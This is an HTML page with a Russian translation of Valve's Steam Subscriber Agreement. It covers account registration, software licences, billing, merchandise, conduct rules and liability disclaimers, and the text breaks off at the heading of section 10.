<HTML>
	<HEAD>
		<TITLE>Соглашение подписчика службы Steam (tm)</TITLE>
		<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<META http-equiv="pragma" content="no-cache">
		<META content="ALL" name="ROBOTS">
		<META content="SteamPowered" name="DESCRIPTION">
		<META content="Steam, account, account creation, signup" name="KEYWORDS">
		<META content="Valve Corporation" name="AUTHOR">
		<STYLE>
			BODY	{
				font-family:verdana, arial, sans-serif;
				font-size:9pt;
				color:#D8DED3;

				margin:12px 12px 24px 12px;
				background:#3E4637;
				line-height:16px;

				scrollbar-face-color: #4C5844;
				scrollbar-shadow-color: #4C5844;
				scrollbar-highlight-color: #4C5844;
				scrollbar-3dlight-color: #818D7C;
				scrollbar-darkshadow-color: #1C261E;
				scrollbar-track-color: #5A6A50;
				scrollbar-arrow-color: #969F8E;
				}
			TABLE	{
				border:0px;
				border-style:none;
				padding:0px;
				margin:0px;
				}
			TR	{
				border:0px;
				margin:0px;
				padding:0px;
				}
			TD	{
				border:0px;
				margin:0px;
				padding:0px;
				}
			HR	{
				margin:8px 0px 12px 0px;
				border-bottom: 1px solid #818D7C;
				border-top: 1px solid #000000;
				width:80%;
				text-align:left;
				}
			DIV	{
				padding:0px;
				margin:0px;
				}
			H1	{
				font-family:trebuchet ms;
				font-size:19pt;
				font-weight:bold;
				line-height:23pt;
				color:white;
				margin:18px 0px 6px 0px;
				letter-spacing:0.2em;
				}
			H2	{
				color:#C4CABE;
				font-family:trebuchet ms,arial narrow,helvetica narrow;verdana,tahoma,helvetica;
				font-size:14px;
				font-weight:bold;
				line-height:18px;
				margin:0px 0px 0px 0px;
				padding:0px;
				/* letter-spacing:0.1em; */
				}
			H3	{
				color:#BFBA50;
				font-family:trebuchet ms,arial narrow,helvetica narrow;verdana,tahoma,helvetica;
				font-size:14px;
				font-weight:bold;
				line-height:18px;
				margin:0px 0px 0px 0px;
				padding:0px;
				letter-spacing:0.1em;
				text-transform:uppercase;
				}
			P	{
				margin-top:0px;
				}
			A {
				}
			A.maize {
				color:#BFBA50;
				}

			A:visited {
				color: #D8DED3; text-decoration:underline;
				}

			A:link {
				color: #D8DED3; text-decoration:underline;
				}

			A:hover {
				color: #ffffff; text-decoration:underline;
				}

			A:active {
				color: #ffffff; text-decoration:underline;
				}

			A:link.maize {
				color: #BFBA50; text-decoration:none; font-weight:bold;
				}

			A:hover.maize {
				color: #BFBA50; text-decoration:none;
				}

			A:visited.maize {
				color: #BFBA50; text-decoration:none; font-weight:bold;
				}
		</STYLE>
	</HEAD>
	<BODY>
			<H3>Соглашение подписчика службы Steam&trade;</H3><br>
Данное Соглашение подписчика службы Steam (далее — «Соглашение») является официальным документом, устанавливающим Ваши права и обязанности как подписчика. Пожалуйста, внимательно ознакомьтесь с его содержанием.<br>
<br>
1. Регистрация и активация<br>
<br>
Steam — это онлайновая услуга («служба Steam»), предлагаемая Valve Corporation ("Valve").<br>
<br>
После установки программного клиента Steam и прохождения регистрации, Вы становитесь подписчиком службы Steam (далее — «Подписчик»). Вы получаете доступ к определенному набору услуг, программным продуктам и определенному контенту ("Подписка"). Ваше Соглашение с Valve вступает в силу после того, как Вы получите доступ к услугам Steam, предварительно приняв условия настоящего Соглашения.<br>
<br>
Если вы не являетесь владельцем Авторизованного Интернет-клуба (определение термина см. далее по тексту), то в соответствии с положениями настоящего Соглашения, на вас не распространяется право использования программного обеспечения Steam и любых его компонентов в коммерческих целях, в том числе в Интернет-клубах, игровых компьютерных центрах и в иных подобных заведениях. Под «Интернет-клубом» подразумевается заведение, оснащенное компьютерами, которые предоставляются во временное пользование посетителям. «Авторизованным Интернет-клубом» может считаться только Интернет-клуб, принявший условия соглашения, размещенного по адресу <a href="http://www.steampowered.com/?area=cybercafe_agreement">http://www.steampowered.com/?area=cybercafe_agreement</a>.<br>
<br>
Каждая Подписка открывает Вам доступ к определенному набору услуг, программного обеспечения и иного контента, в соответствии с условиями, установленными для каждой Подписки, а также условиями, установленными данным Соглашением. Дополнительные условия, установленный для каждой Подписки (далее — «Условия Подписки») применяются только в отношении этой Подписки и становятся частью данного соглашения. Кроме того, дополнительные условия (например, размер оплаты услуг и процедура биллинга) могут размещаться по адресу <a href="http://www.steampowered.com">http://www.steampowered.com</a> либо в службе Steam (далее — «Правила пользования»), также становясь частью данного Соглашения. Становясь Подписчиком, Вы автоматически принимаете все условия Правил конфиденциальности компании Valve, также являющиеся составной частью данного Соглашения. Правила конфиденциальности компании Valve размещены по адресу <a href="http://www.valvesoftware.com/privacy.htm">http://www.valvesoftware.com/privacy.htm</a>.<br>
<br>
Завершив процедуру регистрации в службе Steam, вы создаете собственную учетную запись в службе Steam (далее — «Учетная запись»). Ваша учетная запись может содержать биллинговую информацию, необходимую для приобретения Подписок. Вы несете полную ответственность за все действия, совершенные с использованием Вашей учетной записи, а также за безопасность вашего компьютера. Вы не имеете права раскрывать, передавать или иным образом предоставлять третьим лицам право пользования Вашим паролем или Вашей Учетной записью. Вы соглашаетесь нести личную ответственность за использование Вашего пароля и учетной записи, а также за любую деятельность в службе Steam, ставшую результатом использования Вашего имени пользователя и пароля. Вы не имеете права продавать или предоставлять за плату право пользования своей Учетной записью или иным образом передавать право пользования своей Учетной записью.<br>
<br>
2. Лицензии<br>
<br>
А. Условия предоставления лицензий<br>
<br>
Для использования службы Steam и Вашей Подписок на Ваш компьютер автоматически загружается и устанавливается программное обеспечение, обновления и иной контент (далее — «Программное обеспечение Steam»). Программное обеспечение Steam применяется для доступа к службе Steam в рамках Ваших Подписок. Использование Программного обеспечения Steam в любых иных целях запрещается. Настоящим Соглашением Вы признаете, что по различным причинам, таким как безопасность, стабильность и должное функционирование программы в многопользовательском режиме, может возникнуть необходимость в автоматическом обновлении, проведении предварительной загрузки, создании новых версий или внесении иных улучшений в Программное обеспечение Steam, и, соответственно, системные требования для использования Программного обеспечения Steam со временем могут меняться. Вы признаете, что ни условия данного Соглашения, ни условия определенной Подписки не дают Вам права на получение в будущем обновлений, новых версий или иных улучшений Программного обеспечения Steam, хотя Valve имеет право по своему усмотрению предоставить такие обновления.<br>
<br>
Настоящим Valve передает Вам, а Вы принимаете ограниченное, неэкслюзивное право пользования Программным обеспечением Steam на условиях, изложенных в данном Соглашении и Правилах подписки. Передается право пользования, а не какие-либо иные вещные права. Передаваемое право не порождает никакого титула или права собственности на Программное обеспечение Steam.<br>
<br>
Кроме того, настоящим Valve передает Вам, а Вы принимаете ограниченную, неисключительную лицензию (далее — «Лицензия на Программу Установки») на производство и распространение неограниченного количества полных копий Программы Установки программного клиента Steam (далее — «Программа Установки Steam») посредством загрузки через Интернет, при условии соблюдения следующих требований:<br>
<br>
Программа Установки Steam должна распространяться в полном объеме;<br>
Запрещается вносить любые изменения в Программу Установки Steam, объединять ее с иным программным приложением, или включать ее в иные программные приложения;<br>
Распространение Программы Установки Steam разрешается только на некоммерческой основе (т. е. Вы не должны требовать или получать какую-либо плату и/или иное встречное предоставление за распространение);<br>
К распространяемой Программе Установки Steam должно прилагаться соответствующее лицензионное соглашение с Valve; <br>
Во всех копиях Программы Установки Steam должны сохраняться все указания на право собственности и иные права, полученные Вами вместе с первоначальными копиями Программы Установки Steam.<br>
<br>
B. Условия предоставления Бета-версий Программного обеспечения<br>
<br>
Время от времени Valve имеет право предоставлять Вам через службу Steam программное обеспечение раньше его коммерческого релиза (далее — «Бета-версия»). Вы не обязаны использовать Бета-версии, но имеете право использовать их на следующих условиях. Бета-версия считается Программным обеспечением Steam, а каждая предоставленная Вам копия Бета-версии — Подпиской на соответствующую Бета-версию на следующих специальных условиях:<br>
(i) Ваше право использовать Бета-версию сохраняется до того момента, когда (а) Valve прекратит предоставление Бета-версии; (b) Valve произведет окончательный выпуск соответствующего программного обеспечения или (с) право будет прекращено в соответствии с пунктом 13 данного Соглашения, в зависимости от того, какое из этих событий наступит раньше;<br>
(ii) Некоторые Бета-версии могут предоставляться на особых Условиях подписки, принятие которых является условием использования Бета-версии;<br>
(iii) Valve имеет право просить или требовать от Вас предложений, рецензий или иной информации об использовании Бета-версии; в соответствии с пунктом 7 данного Соглашения такая информация будет считаться Информацией, предоставляемой пользователем; и<br>
(iv) В дополнение к установленным в пункте 9 данного соглашения отказу от претензий и ограничению ответственности, Вы признаете, что Бета-версия не является окончательной версией и может вызвать программный конфликт или причинить повреждения Вашему компьютеру, содержащейся в нем информации и/или установленному на нем программному обеспечению. Вы признаете, что устанавливая Бета-версию, Вы принимаете риск такого повреждения на себя.<br>
<br>
C. Пакет Source SDK<br>
<br>
Ваша Подписка может включать в себя доступ к пакету разработчика программного обеспечения (далее «Пакет SDK») для игрового «движка», используемого в игре Half-Life 2 и других совместимых с нею продуктах Valve ("Source Engine"). Вы вправе использовать, копировать или вносить изменения в Пакете SDK на некоммерческой основе исключительно с целью разработки модифицированной игры (далее — «Модификация») на основе Half-Life 2 или иных продуктов Valve, совместимых с Source Engine и использующих его. Вы имеете право воспроизводить и распространять Модификацию в виде объектного кода и исключительно среди лицензированных конечных пользователей Half-Life 2 и иных совместимых продуктов Valve при условии, что такая Модификация будет находиться в открытом доступе и распространяться на некоммерческой основе. <br>
<br>
Если вы хотите использовать пакет Source SDK или Модификацию в коммерческих целях, пожалуйста, свяжитесь с Valve по следующему адресу: sourceengine@valvesoftware.com.<br>
<br>
D. Право собственности<br>
<br>
Все права собственности и права интеллектуальной собственности, связанные с Программным обеспечением Steam и его копиями принадлежат Valve и/или ее лицензиарам. Все права защищены, если иное не установлено настоящим Соглашением. Права на Программное обеспечение Steam охраняются законодательством Соединенных Штатов об интеллектуальной собственности, международными соглашениями и конвенциями в сфере интеллектуальной собственности и иными нормативно-правовыми актами. Программное обеспечение Steam содержит определенный набор лицензионных материалов, и лицензиары Valve вправе защищать свои права в случае нарушения положений настоящего Соглашения.<br>
<br>
E. Ограничения прав<br>
<br>
За исключением положений, оговоренных в Пункте 2(С) и относящихся к Пакету SDK, вы не имеете права полностью или частично копировать, делать фотокопии, воспроизводить, переводить, проводить обратное поектирование, устанавливать исходный код, модифицировать, разбирать, создавать производные произведения, а также удалять сведения об авторских правах из Программного обеспечения Steam или любого Программного обеспечения, полученного посредством службы Steam, без предварительного письменного согласия Valve.<br>
<br>
Программное обеспечение Steam предназначено для личного пользования. Вы не имеете права: (i) продавать, обременять залогом или передавать копии Программного обеспечения Steam третьим лицам каким-либо способом, предоставлять Программное обеспечение Steam на праве аренды или передавать право пользования им третьим лицам без предварительного письменного согласия Valve; (ii) предоставлять свои услсги по знакомству, имитировать или перенаправлять протоколы связи, используемые Valve в сетевых настройках Программного обеспечения Steam, посредством эмуляции протоколов, тунеллирования, модификаций или привнесения новых компонентов в Программное обеспечение Steam, использования утилит, уже имеющихся или разработанных в будущем, в любых целях, в том числе для сетевой игры через Интернет, сетевой игры с использованием коммерческих и некоммерческих сетей без предварительного письменного разрешения Valve; или (iii) использовать Программное обеспечение Steam или его компоненты в коммерческих целях.<br>
<br>
3. Сопутствующая продукция<br>
<br>
А. Общие положения<br>
<br>
Время от времени Valve может предлагать продукцию, не являющуюся Программным обеспечением или связанными с ним услугами, через службу Steam (например, сопутствующие товары, книги, плакаты и т.д.) (далее — «Сопутствующая продукция»). Valve может предлагать Сопутствующую продукцию как вместе с Подписками, так и отдельно от них, но такая Продукция носит лишь второстепенный характер. Основным назначением службы Steam остаются Подписка и предоставление услуг по ней. Любые сделки в отношении Сопутствующей продукции совершаются в соответствии с положениями настоящего Соглашения. Ваши действия, связанные с размещением заказов на тот или иной вид Продукции, не соответствующие положениям настоящего Соглашения, не связывают Valve никакими обязательствами.<br>
<br>
В. Поставка и риски<br>
<br>
Данный документ является договором поставки. Поставка Продукции осуществляется на условиях FOB Blaine, Washington, за исключением случаев, когда Valve определяет иной способ для каждого конкретного заказа. Если вы являетесь иностранным покупателем, вы соглашаетесь с тем, что Продукция будет поставляться из Соединенных Штатов, и вы будете оплачивать все надлежащие налоги на импорт, таможенные сборы и пошлины. Ответственность Valve ограничивается доставкой Продукции до места погрузки. В случае, если вы вывозите Продукцию со складов Valve, ответственность за Продукцию ложится на вас начиная с момента отпуска Продукции. <br>
<br>
C. Приемка/Отказы/Возвраты<br>
<br>
Положения настоящего Пункта 3С не распространяются на покупателей из Евросоюза. В вашем распоряжении будут тридцать (30) дней с момента получения Продукции, в течение которых вы имеете право проверить ее на предмет соответствия Соглашению и предложением, размещенным через службу Steam. Если Продукция не соответствует положениям настоящего Соглашения и расходится с предложением, размещенным через службу Steam, вы имеете права возвратить ее Valve за свой счет, сопроводив ее копией чека или иным документом, подтверждающим факт покупки. Дополнительная информация, касающаяся возврата бракованной Продукции, находится по адресу: http://storehelp.valvesoftware.com. После получения возвращенной Продукции, Valve в разумный срок и по своему усмотрению обязуется: починить Продукцию, заменить Продукцию ее эквивалентом, перевести на кредитную карту, с которой были списаны средства для покупки Продукции сумму, равную стоимости Продукции (стоимсоть определяется Valve), или предоставить другое средство компенсации, которое было бы оправданным в данном случае. Все требования, предусмотренные данным Соглашением, основанные на претензиях к исправности, объективной ответственности и аналогичных фактах, будут рассматриваться только в том случае, если будут предоставлены Valve в письменном виде в течение тридцати (30) дней с момента получения Продукции.<br>
<br>
4. Биллинг, платежи, другие Подписки<br>
<br>
Valve предлагает как платные, так и бесплатные Подписки. Стоимость Подписки указана в долларах США, если не установлено иное. <br>
<br>
А. Платежи по кредитной карте<br>
<br>
Предоставляя Valve информацию по кредитной карте, вы гарантируете, что являетесь ее законным владельцем и вправе использовать ее для оплаты Продукции, Подписки или иных расходов, и уполномочиваете Valve на списание с нее средств для оплаты Продукции, Подписки или иных Ваших расходов. Внося ежемесячную абонентскую платы за Подписку, вы автоматически подтверждаете право Valve на списание средств в размере абонентской платы. Вы обязаны оповещать Valve в кратчайший срок об изменениях номера вашей кредитной карты, сроках ее действия и/или платежного адреса, а также обязаны уведомить Valve в случае, если у вашей карты закончился срок действия или она блокируется вне зависимости от причин. <br>
<br>
B. Оплата кредитной картой<br>
<br>
ВСЕ КОМИССИОННЫЕ СБОРЫ ЗА ПОЛЬЗОВАНИЕ СЛУЖБОЙ STEAM ВЫПЛАЧИВАЮТСЯ АВАНСОМ И НЕ ПОДЛЕЖАТ ВОЗВРАТУ. Valve оставляет за собой право менять размеры комиссионных сборов и методы биллинга в любое время, при условии предоставления надлежащего письменного извещения не позднее, чем за тридцать (30) дней до вступления их в силу. Все подобные изменения публикуются через службу Steam как поправки к положениям данного Соглашения и Правилам пользования, и на вас лежит ответственность за своевременное ознакомление с ними. Если в течение тридцати (30) дней после того, как изменения вступили в силу, вы не закроете свою учетную запись или не откажетесь от Подписки, это будет означать Ваше согласие с изменениями. Вы вправе отказаться от Подписки и закрыть Учетную запись в любое время, если вы не согласны с такими изменениями, однако в этом случае Valve не обязана возвращать или перерассчитывать внесенную на момент расторжения договора абонентскую плату. Если пользование службой Steam влечет за собой уплату налога на пользование или налога с продаж, Valve вправе взыскать с вас сумму таких налоговых платежей, в дополнение к абонентской плате и иным выплатам, перечисленным в Правилах пользования. Налог на добавленную стоимость на территории стран Евросоюза (далее — «НДС»), взимаемый Valve, включает в себя НДС со стоимости Программного обеспечения Steam или Подписок, а также НДС на импорт за ввоз Сопутствующей продукции.<br>
<br>
Являясь владельцем учетной записи, Вы несете все соответствующие расходы, включая налоги, и оплачиваете все покупки, сделанные Вами или кем-либо через Вашу Учетную запись, включая Ваших друзей и членов семьи. Более подробную информацию о том, как можно закрыть Учетную запись или анулировать Подписку можно найти по адресу: http://www.steampowered.com/. Valve оставляет за собой право взимать абонентскую плату и иные полагающиеся платежи, начисленные до закрытия Учетной записи или анулирования Подписки. Суммы, уплаченные в связи с Учетной записью или Подпиской, не возвращаются в случае расторжения договора. Прежде, чем вновь зарегистрироваться, необходимо погасить задолженности по предыдущей Учетной записи.<br>
<br>
С. Розничная покупка<br>
<br>
Valve может предлагать или требовать оформить Подписку от покупателей продуктов в retail-упаковке или OEM версий своей продукции. Для активации Подписки в поставляемый комплект входит «Ключ CD» или «Ключ продукта».<br>
<br>
D. Авторизированные дилеры службы Steam<br>
<br>
Вы можете приобрести Подписку через авторизированных дилеров Valve. «Ключ продукта», входящий в поставляемый комплект, необходим для активации вашей Подписки. Если вы приобретаете Подписку у авторизированного дилера Valve, все вопросы, связанные с Ключом продукта, должны быть адресованы ему. <br>
<br>
Е. Бесплатная Подписка<br>
<br>
В некоторых случаях Valve может предложить бесплатную Подписку на определенные услуги, программное обеспечение и контент. Как и в случае с платными Подписками, вы берете на себя все расходы, связанные с оплатой услуг провайдера, телефонного соединения и иных издержек, понесенных во время соединения со службой Steam.<br>
<br>
F. Сайты сторонних производителей<br>
<br>
Служба Steam может представлять ссылки на сайты третьих сторон. Некоторые из них могут взимать дополнительную плату за пользование, которая не включена и не относится к абонентской плате за Подписку или к иным платежам, взимаемым за пользование услугами Valve. Служба Steam также может предоставлять доступ к сайтам продавцов, предлагающих контент, товары и/или услуги через службу Steam или Интернет. Вы несете все дополнительные расходы и обязательства, возникшие в результате отношений с этими продавцами. Valve не берет на себя никаких обязательств, прямых или косвенных, связанных с сайтами сторонних производителей.<br>
<br>
G. Ценовая политика и оплата Сопутствующей продукции<br>
<br>
В дополнение к вышеперечисленному, ценообразование и оплата Сопутствующей продукции происходят на следующих условиях. Цены на Сопутствующую Продукцию, указанные на сайте службы Steam, могут быть изменены в любой момент и без предварительного уведомления. Оплата поставки, транспортировки, а также налоговых платежей может включаться не в указанную цену Сопутствующей Продукции, а в стоимость размещения и получения заказа, причем стоимость заказа может и не отражать все налоги, пошлины и комиссионные сборы, которые подлежат уплате в соответствии с местным законодательством. Указанная стоимость поставки и транспортировки может и не отражать реальных затрат Valve. Риски, связанные с военными действиями, морской перевозкой груза, или иные виды страхования, а также портовые и дорожные пошлины, причальные сборы, плата за простой и складские сборы не входят в стоимость Сопутствующей Продукции, указанную на сайте службы Steam. Их уплата является Вашей обязанностью. Кроме того, действующим местным законодательством могут быть установлены дополнительные налоги и сборы за импорт.<br>
<br>
Уплата всех применимых налогов на пользование и продажу, НДС а также иных сборов, взыскиваемых в связи с покупкой Продукции на территории той страны, где подобные сделки подлежат налогообложению, вне зависимости от методов поставки, является Вашей обязанностью. Все налоговые платежи, которые: (i) должны быть уплачены вами вследствие покупки Продукции или уплаты соответствующих платежей, (ii) подлежат уплате Valve в соответствии с применимым законодательством и (iii) рассчитываются на основе платежей по настоящему Соглашению, должны быть выплачены вами Valve. Непредоставление соответствующих счетов со стороны Valve не освобождает вас от необходимости уплаты этих налогов. Вы обязаны немедленно возмещать Valve все суммы налоговых и иных платежей, уплаченных Valve в соответствии с установленными национальным, региональным или местным законодательством в связи с продажей, использованием, производством или перевозкой Сопутствующей продукции.<br>
<br>
5. Нормы поведения, мошенничество в игре и иные незаконные действия<br>
<br>
Настоящим Вы соглашаетесь с тем, что на Вас лежит ответственность за использование вашей Учетной записи, а также ответственность за всю деятельность на сайте службы Steam, ставшую следствием ее использования. Ваше поведение в сети и взаимоотношения с другими подписчиками должны соответствовать общепринятым нормам поведения. Более подробную информацию можно найти по адресу: http://steampowered.com/index.php?area=online_conduct, в Правилах пользования, Условиях подписки, или правилах пользования, предоставленных третьими лицами — организаторами игр, а также лицами, предоставляющими иные услуги.<br>
<br>
Steam и Программное обеспечение Steam могут использовать приложения, необходимые для выявления программных или аппаратных ресурсов, дающих игроку несправедливое преимущество при игре в многопользовательском режиме (далее — «Мошенничество в игре»). Настоящим вы соглашаетесь не создавать и не способствовать созданию средств мошенничества в игре третьими лицами. Вы также соглашаетесь, что не будете прямо или косвенно отключать или иным образом препятствовать работе программ, отвечающих за обнаружение и предотвращение использования мошенничества в игре. Вы соглашаетесь с тем, что как Valve, так и другие многопользовательские серверы могут отказать вам в доступе, если вы будете уличены в мошенничестве в игре. Также, вы соглашаетесь с тем, что о факте вашего мошенничества в игре может быть сообщено Valve и Valve, в свою очередь, может предоставить эту информацию другим игровым серверам, связанным с продукцией Valve. Valve имеет право закрыть Вашу Учетную запись или ликвидировать Подписку в случае, если ваши действия будут истолкованы как противозаконные или иным образом негативно влияющие на использование остальными подписчиками службы Steam. Valve оставляет за собой право ликвидировать вашу Учетную запись/ Подписку без предварительного уведомления.<br>
<br>
6. Контент сторонних производителей<br>
<br>
Под Контентом сторонних производителей подразумевается программное обеспечение и иной контент, предоставляемый третьей стороной и предназначенный для работы с Программным обеспечением Steam (например, Модификации игр Valve). В отношении контента Третьих сторон, Valve выступает исключительно в качестве посредника. Valve не следит за качеством Контента сторонних производителей и не несет никакой ответственности за Контент сторонних производителей.<br>
<br>
7. Пользовательская информация<br>
<br>
Под Пользовательской информацией, подразумеваются сведения, ставшие доступные другим пользователям службы Steam вследствие того, что Вы используете многопользовательские опции Steam, а также Valve, вследствие того, что Вы используете Программное обеспечение Steam. В состав Пользовательской информации включаются в том числе сообщения в чатах и на форуме, игровые предпочтения, данные о деятельности игрока, сведения об использовании, предложения, касающиеся продукции и услуг Valve, и сообщения об ошибках. В соответствии с Правилами конфиденциальности, на которые ссылается пункт 1 Соглашения, Вы передаете Valve полное и безотзывное право на использование, модифицирование, создание производных работ, распространение, трансляцию и иную публичное использование Пользовательской информации, и производных от нее работ в любой форме, в любое время, и в любом месте, без какого бы то ни было упоминания о Вас, вознаграждения и уведомления.<br>
<br>
8. Выделенный сервер<br>
<br>
Ваша Подписка(и) может включать в себя доступ к программного обеспечению Выделенного сервера Valve. Вы имеете право использовать программное обеспечение Выделенного сервера Valve на неограниченном числе компьютеров с целью создания серверов для многопользовательских игр Valve. Если вы используете программное обеспечение Выделенного сервера Valve, на Вас ложатся все затраты, связанные с обеспечением доступа к Интернету, пропускной способностью канала и иными вытекающими из такой деятельности расходами.<br>
9. Отказ от ответственности; ограничение ответственности; отсутствие гарантийных обязательств<br>
<br>
А. ОТКАЗ ОТ ОТВЕТСТВЕННОСТИ<br>
<br>
ВЕСЬ РИСК, СВЯЗАННЫЙ С ИСПОЛЬЗОВАНИЕМ СЛУЖБЫ STEAM, ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ СЛУЖБЫ STEAM И СОПУТСТВУЮЩЕЙ ПРОДУКЦИИ ЦЕЛИКОМ И ПОЛНОСТЬЮ ЛЕЖИТ НА ПОЛЬЗОВАТЕЛЕ. VALVE ОТКАЗЫВАЕТСЯ ОТ (I) ПРЕДОСТАВЛЕНИЯ ЛЮБЫХ ГАРАНТИЙ ПО STEAM, ПРОГРАММНОМУ ОБЕСПЕЧЕНИЮ STEAM, СОПУТСТВУЮЩЕЙ ПРОДУКЦИИ, И (II) ЛЮБЫХ ВЫТЕКАЮЩИХ ИЗ ОБЩЕГО ПРАВА ОБЯЗАННОСТЕЙ В ОТНОШЕНИИ STEAM, ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ STEAM, СОПУТСТВУЮЩЕЙ ПРОДУКЦИИ, В ТОМ ЧИСЛЕ ОТ ОТВЕТСТВЕННОСТИ ЗА НЕОСТОРОЖНОСТЬ. СЛУЖБА STEAM, ПРОГРАММНОЕ ОБЕСПЕЧЕНИЕ STEAM, СОПУТСТВУЮЩАЯ ПРОДУКЦИЯ И ЛЮБАЯ ИНФОРМАЦИЯ, СТАВШАЯ ДОСТУПНОЙ ВСЛЕДСТВИЕ ИХ ИСПОЛЬЗОВАНИЯ, ПРЕДОСТАВЛЯЮТСЯ ПО ПРИНЦИПУ «КАК ЕСТЬ» (Т.Е. БЕЗ ГАРАНТИИ КАЧЕСТВА) И БЕЗ ОТВЕТСТВЕННОСТИ ЗА ДЕФЕКТЫ, А ТАКЖЕ БЕЗ КАКИХ-ЛИБО ГАРАНТИЙ, ПРЯМО УКАЗАННЫХ ИЛИ ПОДРАЗУМЕВАЮЩИХСЯ, В ТОМ ЧИСЛЕ БЕЗ ОГРАНИЧЕНИЙ ГАРАНТИИ ТОВАРНОСТИ ИЛИ ПРИГОДНОСТИ ДЛЯ ОСУЩЕСТВЛЕНИЯ КОНКРЕТНОЙ ЦЕЛИ ИЛИ НЕНАРУШЕНИЕ, А ТАКЖЕ ГАРАНТИИ НЕНАРУШЕНИЯ. VALVE ОСВОБОЖДАЕТСЯ ОТ ЛЮБЫХ ГАРАНТИЙ В ОТНОШЕНИИ НАРУШЕНИЙ, ПРЕДОСТАВЛЯЕМЫХ ПУНКТОМ 2-312(3) ЕДИНОГО КОММЕРЧЕСКОГО КОДЕКСА, И/ИЛИ ЛЮБОГО ДРУГОГО ПРИМЕНИМОГО НОРМАТИВНО-ПРАВОВОГО АКТА. КРОМЕ ТОГО, VALVE ОТКАЗЫВАЕТСЯ ОТ ЛЮБЫХ ГАРАНТИЙ В ОТНОШЕНИИ НАЗВАНИЯ, ПРОТИВОРЕЧИЯ ВАШИМ ПРАВАМ ПО ИСПОЛЬЗОВАНИЮ, А ТАКЖЕ ОТ ГАРАНТИЙ ПОЛНОМОЧИЙ В ОТНОШЕНИИ STEAM, ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ СЛУЖБЫ STEAM, СОПУТСТВУЮЩЕЙ ПРОДУКЦИИ И ИНФОРМАЦИИ, СТАВШЕЙ ДОСТУПНОЙ ВСЛЕДСТВИЕ ИХ ИСПОЛЬЗОВАНИЯ. ДАННЫЙ ПУНКТ ОБЯЗАТЕЛЕН К ИСПОЛНЕНИЮ В МАКСИМАЛЬНО ДОЗВОЛЕННЫХ ПРИМЕНИМЫМ ПРАВОМ РАМКАХ. <br>
<br>
В. ОГРАНИЧЕНИЕ ОТВЕТСТВЕННОСТИ<br>
<br>
НИ VALVE, НИ ЕЕ ЛИЦЕНЗИАРЫ, НИ ИХ АФФИЛИРОВАННЫЕ ЛИЦА НЕ НЕСУТ ОТВЕТСТВЕННОСТИ ЗА УБЫТКИ, СТАВШИЕ СЛЕДСТВИЕМ ИСПОЛЬЗОВАНИЯ ИЛИ НЕВОЗМОЖНОСТИ ИСПОЛЬЗОВАНИЯ СЛУЖБЫ STEAM, ВАШЕЙ УЧЕТНОЙ ЗАПИСИ, ВАШИХ ПОДПИСОК И ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ STEAM, В ТОМ ЧИСЛЕ ПОТЕРЮ НЕМАТЕРИАЛЬНЫХ АКТИВОВ, ОСТАНОВКУ РАБОЧЕГО ПРОЦЕССА, ВЫХОД ИЗ СТРОЯ ИЛИ НЕИСПРАВНОЕ ФУНКЦИОНИРОВАНИЕ КОМПЬЮТЕРОВ, А ТАКЖЕ ЛЮБЫЕ ДРУГИЕ КОММЕРЧЕСКИЕ УБЫТКИ. VALVE НЕ НЕСЕТ ОТВЕТСТВЕННОСТИ ЗА ПРЯМЫЕ, КОСВЕННЫЕ, ВТОРОСТЕПЕННЫЕ, ОСОБЕННЫЕ, ШТРАФНЫЕ И ИНЫЕ УБЫТКИ, СТАВШИЕ СЛЕДСТВИЕМ ПОЛЬЗОВАНИЯ СЛУЖБОЙ STEAM, ИСПОЛЬЗОВАНИЯ ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ СЛУЖБЫ STEAM, СОПУТСТВУЮЩЕЙ ПРОДУКЦИИ, ПРИОБРЕТЕННОЙ ЧЕРЕЗ СЛУЖБУ STEAM, ИНФОРМАЦИИ, СТАВШЕЙ ДОСТУПНОЙ В РЕЗУЛЬТАТЕ ПОЛЬЗОВАНИЯ УСЛУГАМИ СЛУЖБЫ STEAM, А ТАКЖЕ ЗА ЗАДЕРЖКИ ИСПОЛЬЗОВАНИЯ ИЛИ НЕВОЗМОЖНОСТИ ИСПОЛЬЗОВАНИЯ СОПУТСТВУЮЩЕЙ ПРОДУКЦИИ ИЛИ ИНФОРМАЦИИ, ДАЖЕ В ТОМ СЛУЧАЕ, ЕСЛИ ЭТО СТАЛО СЛЕДСТВИЕМ ВИНОВНОГО ДЕЯНИЯ, ДЕЛИКТА (В ТОМ ЧИСЛЕ ГРУБОЙ НЕОСТОРОЖНОСТИ), ДЕЯНИЙ, ВЛЕКУЩИХ ПРЯМУЮ ОТВЕТСТВЕННОСТЬ, НАРУШЕНИЙ ПОЛОЖЕНИЙ СОГЛАШЕНИЯ ИЛИ ГАРАНТИЙНЫХ ОБЯЗАТЕЛЬСТВ VALVE. ДАННЫЕ ОГРАНИЧЕНИЯ И ИСКЛЮЧЕНИЯ ОСТАЮТСЯ В СИЛЕ ДАЖЕ В ТОМ СЛУЧАЕ, КОГДА ИНЫЕ СРЕДСТВА ПРАВОВОЙ ЗАЩИТЫ НЕ ДЕЙСТВУЮТ.<br>
ЕСЛИ ВЫ ЯВЛЯЕТЕСЬ ГРАЖДАНИНОМ СТРАНЫ, ВХОДЯЩЕЙ В ЕВРОСОЮЗ, ВЫШЕИЗЛОЖЕННОЕ МОЖЕТ НА ВАС НЕ РАСПРОСТРАНЯТЬСЯ.<br>
<br>
С. ОТСУТСТВИЕ ГАРАНТИЙ<br>
<br>
VALVE НЕ ГАРАНТИРУЕТ БЕСПЕРЕБОЙНУЮ, БЕЗОШИБОЧНУЮ, СВОБОДНУЮ ОТ ВИРУСОВ И БЕЗОПАСНУЮ РАБОТУ ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ STEAM, А ТАКЖЕ БЕСПЕРЕБОЙНЫЙ, БЕЗОШИБОЧНЫЙ, СВОБОДНЫЙ ОТ ВИРУСОВ И БЕЗОПАСНЫЙ ДОСТУП К СЛУЖБЕ STEAM, ВАШЕЙ УЧЕТНОЙ ЗАПИСИ И/ИЛИ ПОДПИСКЕ (ПОДПИСКАМ).<br>
<br>
10. ЕДИНСТВЕННОЕ СРЕДСТВО ПРАВОВОЙ ЗАЩИТЫ<br>
<br>
